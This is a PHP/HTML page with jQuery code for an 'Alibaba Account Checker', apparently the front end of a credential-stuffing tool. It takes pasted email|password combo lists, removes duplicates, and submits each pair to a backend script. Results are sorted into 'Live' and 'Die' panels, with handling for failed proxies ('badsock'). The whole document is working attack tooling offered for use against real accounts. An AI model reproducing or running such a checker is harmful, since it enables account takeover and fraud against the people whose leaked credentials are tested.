<?php
include('../../head.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="description" content="Alibaba Account Checker" />
	<meta name="author" content="Alibaba Account Checker" />
	<title>Alibaba Account Checker</title>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.1/jquery-ui.min.js"></script>
	<style>
			body
		

		.business{
			font-weight:bold;
			color:yellow;
		}
		.premier{
			font-weight:bold;
			color:#00FF00;
		}
		.verified{
			font-weight:bold;
			color:#006DB0;
		}
		.fieldset{
			border: 1px dashed #cccccc;
			margin-top: 20px;
		}
		.tvmit_live{
			border: 1px dashed #cccccc;
			color:yellow;
			font-weight:bold;
		}
		.tvmit_die{
			border: 1px dashed #cccccc;
			color:red;
			font-weight:bold;
		}
		#result{
			display:none;
		}
	</style>
	
<script type="text/javascript">

		var ajaxCall;

		Array.prototype.remove = function(value){
			var index = this.indexOf(value);
			if(index != -1){
				this.splice(index, 1);
			}
			return this;
		};
		function enableTextArea(bool){
			$('#mailpass').attr('disabled', bool);
		}
		function tvmit_liveUp(){
			var count = parseInt($('#tvmit_live_count').html());
			count++;
			$('#tvmit_live_count').html(count+'');
		}
		function tvmit_dieUp(){
			var count = parseInt($('#tvmit_die_count').html());
			count++;
			$('#tvmit_die_count').html(count+'');
		}

		function stopLoading(bool){
			$('#loading').attr('src', 'clear.gif');
			var str = $('#checkStatus').html();
			$('#checkStatus').html(str.replace('Checking','Stopped'));
			enableTextArea(false);
			$('#submit').attr('disabled', false);
			$('#stop').attr('disabled', true);
			if(bool){
				alert('Done');
			}else{
				ajaxCall.abort();
			}
			updateTitle('Alibaba Account Checker');
		}
		function updateTitle(str){
			document.title = str;
		}
		function updateTextBox(mp){
			var mailpass = $('#mailpass').val().split("\n");
			mailpass.remove(mp);
			$('#mailpass').val(mailpass.join("\n"));
		}
		function OKTY(lstMP, curMP,  delim, cEmail, maxFail, failed){
			
			if(lstMP.length<1 ||curMP>=lstMP.length){
				stopLoading(true);
				return false;
			}
			if(failed>=maxFail){
			
				OKTY(lstMP, curMP, delim, cEmail, maxFail, 0);
				return false;
			}
			updateTextBox(lstMP[curMP]);
			
			ajaxCall = $.ajax({
				url: 'function.php',
				dataType: 'json',
				cache: false,
				type: 'POST',
				beforeSend: function (e) {
					updateTitle(lstMP[curMP] + ' - ALIBABA ACCOUNT CHECKER');
					$('#checkStatus').html('Checking: ' + lstMP[curMP]).effect("highlight", {color:'#00ff00'}, 1000);
					$('#loading').attr('src', '/check/pepe/loading.gif');
				},
				data: 'ajax=1&do=check&mailpass='+encodeURIComponent(lstMP[curMP])
						+'&delim='+encodeURIComponent(delim)+'&email='+cEmail,
				success: function(data) {
					switch(data.error){
						case -1:
							curMP++;
							$('#wrong').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
							break;
						case 1:
						case 3:
							$('#badsock').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
							break;
						case 2:
							curMP++;
							$('#tvmit_die').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
							failed++;
							tvmit_dieUp();
							break;
						case 0:
							curMP++;
							$('#tvmit_live').append(data.msg+'<br />').effect("highlight", {color:'#00ff00'}, 1000);
							tvmit_liveUp();
							break;
					}
					OKTY(lstMP, curMP, delim, cEmail, maxFail, failed);
				}
			});
			return true;
		}
		function filterMP(mp, delim){
			var mps = mp.split("\n");
			var filtered = new Array();
			var lstMP = new Array();
			for(var i=0;i<mps.length;i++){
				if(mps[i].indexOf('@')!=-1){
					var infoMP = mps[i].split(delim);
					for(var k=0;k<infoMP.length;k++){
						if(infoMP[k].indexOf('@')!=-1){
							var email = $.trim(infoMP[k]);
							var pwd = $.trim(infoMP[k+1]);
							if(filtered.indexOf(email.toLowerCase())==-1){
								filtered.push(email.toLowerCase());
								lstMP.push(email+'|'+pwd);
								break;
							}
						}
					}
				}
			}
			return lstMP;
		}
		$(document).ready(function(){
			$('#stop').attr('disabled', true).click(function(){
			  stopLoading(false);  
			});
			$('#submit').click(function(){
				var delim = $('#delim').val().trim();
				var mailpass = filterMP($('#mailpass').val(), delim);
				var bank = $('#bank').is(':checked') ? 1 : 0;
				var card = $('#card').is(':checked') ? 1 : 0;
				var infor = $('#info').is(':checked') ? 1 : 0;
				var cEmail = $('#email').is(':checked') ? 1 : 0;
				var maxFail = parseInt($('#fail').val());
				var failed = 0;
				if($('#mailpass').val().trim()==''){
					alert('No Mail/Pass found!');
					return false;
				}
			
				$('#mailpass').val(mailpass.join("\n")).attr('disabled', true);
				$('#result').show();
				$('#submit').attr('disabled', true);
				$('#stop').attr('disabled', false);
				OKTY(mailpass,  0, delim, cEmail, maxFail, 0);
				return false; 
			});
		});
</script>
</head>
<body>

<br /><br />
<div class="main-content">
                 <!--/span-->
                    <div class="row-fluid">
                            <!-- block -->
                            <div class="block">
                                <div class="navbar navbar-inner block-header">
                                    <div><center><b>Alibaba Account Checker</b></center></div>
                                </div>
                                <div class="block-content collapse in">

<form method="post">
	<div align="center">
		<textarea placeholder="example@email.com|Password" name="mailpass" id="mailpass" cols="60" rows="10" style="margin: 0px 0px 10px; width: 494px; height: 200px;"></textarea><?php

echo $emailArea;

?></textarea>
<br />
<center><script id="_waupw2">var _wau = _wau || [];
_wau.push(["tab", "u8tylhw1w8yn", "pw2", "right-upper"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="/tab.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script></center>
		<b>Delim:</b> <input type="text" name="delim" id="delim" value="|"  cols="30" rows="10" style="margin: 0px; height: 20px; width: 10px;" /><br>
		<input type="button" class = "btn btn-success" value="Submit" id="submit" />&nbsp;<input type="button" class = "btn btn-danger" value="STOP" id="stop" /><br /><br />
        <img id="loading" src="clear.gif" /><br />
        <span id="checkStatus"></span>
	
                                    </div>
                                </div>
                            </div>
                            <!-- /block -->
                        </div>
</form>
  </center></section>
</div>
<div id="result">
<!--/span-->
                    <div class="row-fluid">
                            <!-- block -->
                            <div class="block">
                                <div class="navbar navbar-inner block-header">
                                    <div class="muted pull-left">
        <font color="black"><i class="icon-th-list"></i><b> Live </b></font><span class="badge badge-success" class="pull-right" id="tvmit_live_count">0</span>
</div>
                                </div>
                                <div class="block-content collapse in">
        <div id="tvmit_live">
                                    </div>
                                </div>
                            </div>
                            <!-- /block -->
                        </div>                    <div class="row-fluid">
                            <!-- block -->
                            <div class="block">
                                <div class="navbar navbar-inner block-header">
                                    <div class="muted pull-left">
        <font color="black"><i class="icon-th-list"></i><b> Die </b></font><span class="badge badge-important" class="pull-right" id="tvmit_die_count">0</span></div>
                                </div>
                                <div class="block-content collapse in">
        <div id="tvmit_die"></div>
</div>
                                    </div>
                                </div>
                            </div>
                            <!-- /block -->
                        </div>
                                </div>
                            </div>
</div>
</body>
</html>